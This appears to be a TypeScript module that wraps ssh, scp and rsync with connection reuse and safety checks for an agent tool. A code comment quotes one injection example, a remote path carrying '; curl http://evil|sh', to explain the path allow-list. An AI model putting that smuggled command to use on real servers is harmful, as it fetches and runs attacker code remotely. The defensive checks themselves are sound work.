/**
 * ssh 的连接复用层 —— **ControlMaster 就是连接池**。
 *
 * 不自己维护连接对象：每条命令都带上同一个 control socket，第一条顺手成为 master，
 * 后续的复用它的 TCP 与那一次认证，第二条起几乎没有握手开销。于是「一个会话同时连多台」
 * 不需要任何连接管理代码 —— 参数里换个别名而已。
 *
 * **Windows 没有 ControlMaster**（Win32-OpenSSH 至今不支持 Unix socket 多路复用），而且更阴的是：
 * 用户配置里若全局设了 ControlMaster，`ssh.exe` 会直接以 `getsockname failed` 失败，**省略参数
 * 救不了**。所以那边显式传 `-o ControlMaster=no -o ControlPath=none` 把它按掉，降级成每条命令
 * 各自建连 —— 功能一致，只是慢。
 *
 * 一律 `-o BatchMode=yes`：任何交互提示（密码、passphrase、主机指纹）在这里都只会挂死。
 * 代价是首次连一台陌生主机会直接失败，这被刻意转成一条可操作的说明（见 classifySshFailure）。
 */
import { spawn } from 'child_process'
import { createHash } from 'crypto'
import { mkdirSync, rmSync, existsSync, readdirSync, statSync, chmodSync } from 'fs'
import { join } from 'path'
import { userInfo } from 'os'
import { buildSpawnEnv } from '../../utils/paths'
import { createLogger } from '../../logger'

const log = createLogger('ssh:control')

/** master 在最后一条命令之后还活多久 */
const CONTROL_PERSIST = '10m'
/** 建连超时（秒） */
const CONNECT_TIMEOUT_SEC = 15
/** 进程退出后再等多久收尾巴输出（毫秒）—— `close` 没来也要落定，见 runProcess */
const EXIT_DRAIN_MS = 300

const isWindows = process.platform === 'win32'

export interface SshExecResult {
  stdout: string
  stderr: string
  /** 命令的退出码；超时为 124；ssh 自身失败（连不上等）为 255 */
  exitCode: number
  timedOut: boolean
}

/**
 * control socket 的根目录。
 *
 * 放 `/tmp` 而不是 `~/.shuvix`：Unix domain socket 的路径有 104 字节上限，而 macOS 的
 * `os.tmpdir()` 本身就有五十来字符，套上会话 id 很容易越界。固定短前缀 + 16 位哈希稳稳在限内。
 */
function controlRoot(): string {
  // 可覆写：测试要彼此隔离（下面那道权限复核会真的改目录权限），
  // 而 /tmp 不可写的环境也需要一个出口。现读，不缓存。
  const override = process.env.SHUVIX_SSH_CONTROL_ROOT
  if (override) return override
  const uid = typeof userInfo().uid === 'number' ? userInfo().uid : 0
  return `/tmp/shuvix-ssh-${uid}`
}

/** 某条会话某台主机的 control socket 路径（Windows 无此概念） */
function controlPath(sessionId: string, alias: string): string | undefined {
  if (isWindows) return undefined
  // sessionId 是 uuidv7，不含冒号，所以这个分隔符不会让两组不同输入撞成同一串
  const hash = createHash('sha256').update(sessionId).update(':').update(alias).digest('hex')
  return join(controlRoot(), hash.slice(0, 16))
}

/**
 * 确保 control socket 目录存在且只有自己进得去。
 *
 * `mkdirSync` 的 `mode` **只在创建那一刻生效**（而且还要过 umask），目录已存在时
 * `recursive: true` 是静默的空操作。而这个路径是完全可预测的
 * （`/tmp/shuvix-ssh-<uid>`），共享机器上别的用户完全可以抢先把它建成 0777 ——
 * 之后 ShuviX 就会把**活的、已认证的**多路复用 socket 丢进一个别人控制的目录里，
 * 那等于把身份借出去。所以建完还要复核：不是自己的就拒绝，权限松了就收紧。
 */
function ensureControlRoot(): void {
  if (isWindows) return
  const root = controlRoot()
  mkdirSync(root, { recursive: true, mode: 0o700 })
  const st = statSync(root)
  const myUid = typeof process.getuid === 'function' ? process.getuid() : st.uid
  if (st.uid !== myUid) {
    throw new Error(
      `SSH control socket directory ${root} is owned by another user; refusing to use it.`
    )
  }
  if ((st.mode & 0o077) !== 0) chmodSync(root, 0o700)
}

/**
 * `-F` 覆写配置文件。
 *
 * 不是测试专用的口子：`configPath` 覆写若只作用于枚举（listSshHosts）而 `ssh` 仍读用户真实配置，
 * 两边看到的就是两份不同的文件 —— 别名对得上纯属巧合。要覆写就两边一起覆写。
 * 注意 OpenSSH 的 `~` 展开走 getpwuid()，改 `$HOME` 是没用的，只有 `-F` 算数。
 */
function configArgs(configPath: string | undefined): string[] {
  return configPath ? ['-F', configPath] : []
}

/** 复用/多路复用相关的固定参数 */
function multiplexArgs(sock: string | undefined): string[] {
  if (!sock) {
    // Windows：显式按掉，否则用户配置里的全局 ControlMaster 会让 ssh.exe 直接报错
    return ['-o', 'ControlMaster=no', '-o', 'ControlPath=none']
  }
  return [
    '-o',
    'ControlMaster=auto',
    '-o',
    `ControlPath=${sock}`,
    '-o',
    `ControlPersist=${CONTROL_PERSIST}`
  ]
}

/** 跑一个子进程（ssh / scp / rsync 共用超时、中止与输出收集） */
function runProcess(
  bin: string,
  args: string[],
  opts: { timeoutSec: number; signal?: AbortSignal }
): Promise<SshExecResult> {
  return new Promise((resolve, reject) => {
    if (opts.signal?.aborted) {
      reject(new Error('Aborted'))
      return
    }
    const child = spawn(bin, args, {
      env: buildSpawnEnv() as NodeJS.ProcessEnv,
      // stdin 直接关掉：BatchMode 下没有交互，留着只会让读 stdin 的远端命令等到超时
      stdio: ['ignore', 'pipe', 'pipe'],
      // Windows 上 ssh.exe / scp.exe 是控制台程序，不隐藏就每次弹一个空控制台窗口
      windowsHide: true
    })

    let stdout = ''
    let stderr = ''
    let timedOut = false
    let settled = false

    let exited = false
    const kill = (): void => {
      child.kill('SIGTERM')
      // 宽限后强杀。判据必须是「进程真的退了吗」，**不能**用 `child.killed` ——
      // 那个字段的含义是「发过信号」，SIGTERM 调用之后它就已经是 true，
      // 于是这行升级永远不会执行（曾经就是一段死代码）。
      setTimeout(() => {
        if (!exited) child.kill('SIGKILL')
      }, 2000).unref()
    }

    const timer = setTimeout(() => {
      timedOut = true
      kill()
    }, opts.timeoutSec * 1000)

    const done = (fn: () => void): void => {
      if (settled) return
      settled = true
      clearTimeout(timer)
      opts.signal?.removeEventListener('abort', onAbort)
      fn()
    }

    function onAbort(): void {
      kill()
      done(() => reject(new Error('Aborted')))
    }
    opts.signal?.addEventListener('abort', onAbort, { once: true })

    child.stdout.on('data', (d: Buffer) => {
      stdout += d.toString('utf-8')
    })
    child.stderr.on('data', (d: Buffer) => {
      stderr += d.toString('utf-8')
    })
    child.on('error', (err) => {
      done(() =>
        reject(
          new Error(
            err.message.includes('ENOENT')
              ? `The \`${bin}\` command was not found on this machine.`
              : `Failed to run ${bin}: ${err.message}`
          )
        )
      )
    })
    /**
     * 同时听 `exit` 和 `close`，是一层**防御**，不是在修一个观察到的故障。
     *
     * `close` 要等所有 stdio 都关掉才发，而 ControlPersist 留下的后台 `[mux]` master
     * 继承着同一个 stderr 管道 —— 只要它活着，管道就还有写端。理论上被 kill 掉的
     * scp/ssh 早已退出而 `close` 迟迟不来，那会让**超时与中止永久挂住**，
     * 而「中止」按钮正是靠这条路生效的。
     *
     * 实测在 macOS + OpenSSH 10.2 上复现不出来（`close` 照常触发，见 SSHCTL-U-27），
     * 所以这里不写成「修复」。但只挂在 `close` 上就是把「能不能中止」交给孙进程什么时候
     * 松手，这个赌注不值得下：`close` 仍是首选（那时输出一定收全），`exit` 之后给一小段
     * 宽限窗口收尾巴，窗口到了就拿现有输出落定。
     */
    const settle = (code: number | null): void =>
      done(() => resolve({ stdout, stderr, exitCode: timedOut ? 124 : (code ?? 1), timedOut }))

    child.on('exit', (code) => {
      exited = true
      setTimeout(() => settle(code), EXIT_DRAIN_MS).unref()
    })
    child.on('close', (code) => settle(code))
  })
}

/**
 * 在远端跑一条命令。`alias` 必须是调用方已经核对过的 `~/.ssh/config` 别名 ——
 * 这里不做核对，核对在 server 那一层（见 sshServer 的 resolveAlias）。
 */
export async function sshExec(opts: {
  sessionId: string
  alias: string
  command: string
  timeoutSec: number
  signal?: AbortSignal
  /** 配置文件覆写；必须与枚举用的是同一份 */
  configPath?: string
}): Promise<SshExecResult> {
  ensureControlRoot()
  const sock = controlPath(opts.sessionId, opts.alias)
  const args = [
    ...configArgs(opts.configPath),
    '-o',
    'BatchMode=yes',
    '-o',
    `ConnectTimeout=${CONNECT_TIMEOUT_SEC}`,
    ...multiplexArgs(sock),
    // `--` 终止选项解析：即便别名不知怎么以 `-` 开头混了进来，ssh 也只会把它当主机名，
    // 不会当成 `-oProxyCommand=…` 那种能在**本地**执行命令的选项。与 sshConfig 的过滤
    // 和 sshServer 的复核构成三道 —— 这条路上一次失手的代价是安全门被整个绕开。
    '--',
    opts.alias,
    opts.command
  ]
  log.info(`exec ${opts.alias}: ${opts.command.slice(0, 80)}`)
  return runProcess('ssh', args, { timeoutSec: opts.timeoutSec, signal: opts.signal })
}

/** 传输方向：up = 本地→远端，down = 远端→本地 */
export type TransferDirection = 'up' | 'down'

/**
 * 文件传输（scp）。
 *
 * 复用同一个 control socket，所以传文件不会再认证一次。现代 OpenSSH 的 scp 走 SFTP 子系统，
 * 远端不需要有 scp 命令。远端路径原样交给 scp 的 `host:path` 形式 —— 别名已在 server 那层
 * 核对过，`--` 则挡住任何以 `-` 开头的路径被当成选项。
 */
export async function sshCopy(opts: {
  sessionId: string
  alias: string
  direction: TransferDirection
  localPath: string
  remotePath: string
  timeoutSec: number
  signal?: AbortSignal
  configPath?: string
}): Promise<SshExecResult> {
  ensureControlRoot()
  const sock = controlPath(opts.sessionId, opts.alias)
  const remote = `${opts.alias}:${opts.remotePath}`
  const args = [
    // `-s` 把协议钉在 SFTP 上。OpenSSH 9 之前 scp 默认走**旧 SCP 协议**，那条路会在远端
    // 拼出一条命令行、由远端 shell 求值 —— 远端路径里的 `;` 就成了远端命令执行。
    // 走 SFTP 时路径是协议里的一个字段，原样抵达，不经任何 shell。
    '-s',
    ...configArgs(opts.configPath),
    '-o',
    'BatchMode=yes',
    '-o',
    `ConnectTimeout=${CONNECT_TIMEOUT_SEC}`,
    ...multiplexArgs(sock),
    '--',
    ...(opts.direction === 'up' ? [opts.localPath, remote] : [remote, opts.localPath])
  ]
  log.info(`scp ${opts.direction} ${opts.alias}: ${opts.remotePath}`)
  return runProcess('scp', args, { timeoutSec: opts.timeoutSec, signal: opts.signal })
}

/** rsync 探测结果（进程级缓存：一台机器上装没装 rsync 不会在运行期变） */
let rsyncProbe: Promise<boolean> | undefined

/**
 * 这台机器有 rsync 吗。
 *
 * 必须探测而不能假定：Windows 没有内置 rsync，而 macOS 15 起把 rsync 换成了 openrsync
 * （选项不全）。所以 `sync` 工具**探测到才注册** —— 声明一个跑不起来的工具，
 * 只会让模型在上面反复撞墙。
 */
export function rsyncAvailable(): Promise<boolean> {
  if (!rsyncProbe) {
    rsyncProbe = runProcess('rsync', ['--version'], { timeoutSec: 5 })
      .then((r) => r.exitCode === 0)
      .catch(() => false)
  }
  return rsyncProbe
}

/**
 * rsync 的远端路径**必须**过这道白名单。
 *
 * rsync 不像 scp 那样有协议字段可放路径：它把远端路径塞进一条交给 ssh 的 argv，
 * 而 ssh 会把剩余参数用空格拼成一条命令交给远端**登录 shell** 求值。实测
 * `rsync -e ssh -- src 'prod:/tmp/x; curl http://evil|sh'` 会在远端真的执行那条 curl。
 * 所以这里用白名单而不是黑名单 —— 少列一个危险字符的代价是远端命令执行。
 * 需要更花的路径就用 exec（它过命令门）或 upload/download（它们走 SFTP，路径原样抵达）。
 */
const SAFE_REMOTE_PATH = /^~?[A-Za-z0-9._/@+:=-]*$/

export function unsafeRemotePathReason(remotePath: string): string | undefined {
  if (!SAFE_REMOTE_PATH.test(remotePath)) {
    return `The remote path ${JSON.stringify(remotePath)} contains characters that rsync would hand to the remote shell. Use only letters, digits and ._/@+:=- (a leading ~ is allowed). For anything else use exec, or upload/download, which pass the path over SFTP instead.`
  }
  return undefined
}

/**
 * 目录同步（rsync over ssh），同样复用 control socket。
 *
 * 已知限制：rsync 自己按空白切分 `-e` 的值，所以那串里的路径不能带空格。
 * 生产路径（`/tmp/shuvix-ssh-<uid>/<hash>`）不会带，覆写了 `SHUVIX_SSH_CONTROL_ROOT`
 * 到带空格的目录才会踩到。
 */
export async function sshSync(opts: {
  sessionId: string
  alias: string
  direction: TransferDirection
  localPath: string
  remotePath: string
  timeoutSec: number
  signal?: AbortSignal
  configPath?: string
}): Promise<SshExecResult> {
  ensureControlRoot()
  const sock = controlPath(opts.sessionId, opts.alias)
  const sshCmd = [
    'ssh',
    ...configArgs(opts.configPath),
    '-o',
    'BatchMode=yes',
    '-o',
    `ConnectTimeout=${CONNECT_TIMEOUT_SEC}`,
    ...multiplexArgs(sock)
  ].join(' ')
  const remote = `${opts.alias}:${opts.remotePath}`
  const args = [
    '-a',
    '-e',
    sshCmd,
    '--',
    ...(opts.direction === 'up' ? [opts.localPath, remote] : [remote, opts.localPath])
  ]
  log.info(`rsync ${opts.direction} ${opts.alias}: ${opts.remotePath}`)
  return runProcess('rsync', args, { timeoutSec: opts.timeoutSec, signal: opts.signal })
}

/** 关掉某台主机的 master（`ssh -O exit`）。返回「本来是否连着」 */
export async function sshDisconnect(
  sessionId: string,
  alias: string,
  configPath?: string
): Promise<boolean> {
  const sock = controlPath(sessionId, alias)
  if (!sock || !existsSync(sock)) return false
  try {
    await runProcess(
      'ssh',
      [...configArgs(configPath), '-o', `ControlPath=${sock}`, '-O', 'exit', '--', alias],
      { timeoutSec: 10 }
    )
  } catch (err: unknown) {
    log.warn(`disconnect ${alias}: ${err instanceof Error ? err.message : String(err)}`)
  }
  // `-O exit` 正常会自己删掉 socket；残留的清掉，免得下次 ControlMaster=auto 撞上死 socket
  rmSync(sock, { force: true })
  return true
}

/** 这条会话当前连着哪些主机（按 socket 是否存在判断） */
export function sshConnectedAliases(sessionId: string, aliases: string[]): string[] {
  if (isWindows) return []
  return aliases.filter((a) => {
    const sock = controlPath(sessionId, a)
    return !!sock && existsSync(sock)
  })
}

/**
 * 关掉这条会话名下所有 master（会话销毁时）。
 *
 * 不知道会话连过哪些别名，所以按 socket 目录反查：路径是由 sessionId 与别名一起哈希出来的，
 * 拿候选别名重算一遍就能认出自己的那些。认不出的一律不碰 —— 那是别的会话的连接。
 */
export async function sshCloseSession(
  sessionId: string,
  aliases: string[],
  configPath?: string
): Promise<number> {
  if (isWindows || !existsSync(controlRoot())) return 0
  const mine = new Map(aliases.map((a) => [controlPath(sessionId, a) ?? '', a]))
  let closed = 0
  for (const name of readdirSync(controlRoot())) {
    const alias = mine.get(join(controlRoot(), name))
    if (!alias) continue
    if (await sshDisconnect(sessionId, alias, configPath)) closed++
  }
  return closed
}

/**
 * 把 ssh 自身的失败翻译成对 agent 可操作的说明。
 *
 * 首连一台陌生主机在 BatchMode 下必然失败 —— 这是刻意的：ShuviX **不**替用户往
 * `~/.ssh/known_hosts` 写条目。一次「是否信任这台机器」的弹窗，用户在那一刻根本无从核对指纹，
 * 点下去只是安慰；而被提示注入的 agent 正好可以借它把一台中间人机器变成「已信任」。
 * 让用户在自己的终端里连一次，ssh 会把指纹打出来，他能拿别的渠道对照 —— 信任决定留在那里。
 */
export function classifySshFailure(alias: string, stderr: string, stdout = ''): string | undefined {
  // 255 也可能是**远端命令自己**的退出码。远端一旦有输出，这次调用就确实连上了，
  // 那 255 就是命令的意思，不是 ssh 的 —— 别把它翻译成「认证失败，去看 ssh-add -l」。
  if (stdout !== '') return undefined
  const s = stderr.toLowerCase()
  if (/^host key verification failed/m.test(s) || s.includes('no matching host key')) {
    return `The host key for "${alias}" is not in the user's known_hosts, so ssh refused to connect. ShuviX will not add it — ask the user to run "ssh ${alias}" once in their own terminal, check the fingerprint it prints, and accept it there. Then retry.`
  }
  if (s.includes('remote host identification has changed')) {
    return `The host key for "${alias}" has CHANGED since it was recorded in known_hosts. That can mean the server was rebuilt — or that the connection is being intercepted. Do not work around it: tell the user and let them resolve it in their own terminal.`
  }
  // ssh 自己的拒绝恒带认证方式清单（`Permission denied (publickey,password).`）；
  // 远端 shell 的 `Permission denied` 没有那个括号
  if (/permission denied \(/.test(s)) {
    return `Authentication to "${alias}" was refused (permission denied). ShuviX holds no credentials — ssh uses the user's own keys and agent. Ask the user to check that the right key is loaded ("ssh-add -l") and that "ssh ${alias}" works in their terminal.`
  }
  if (s.includes('ssh: could not resolve hostname') || s.includes('name or service not known')) {
    return `The hostname configured for "${alias}" could not be resolved.`
  }
  if (/ssh: .*(connection timed out|operation timed out)/.test(s)) {
    return `Connecting to "${alias}" timed out after ${CONNECT_TIMEOUT_SEC}s.`
  }
  if (/ssh: .*connection refused/.test(s)) {
    return `The SSH port on "${alias}" refused the connection.`
  }
  return undefined
}
